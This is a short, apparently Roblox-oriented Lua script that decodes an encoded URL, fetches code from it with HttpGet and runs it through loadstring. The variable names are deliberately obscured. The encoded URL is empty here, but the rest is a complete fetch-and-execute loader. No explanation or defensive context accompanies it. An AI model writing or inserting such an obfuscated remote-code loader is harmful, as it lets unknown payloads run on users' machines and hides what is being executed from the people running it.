local A1 = getfenv().game
local B2 = ""

local function decode(str)
    local result = ""
    for code in str:gmatch("/(%d+)") do
        result = result .. string.char(tonumber(code))
    end
    return result
end

local C3 = A1["HttpGet"](A1, decode(B2))
assert(loadstring(C3))()
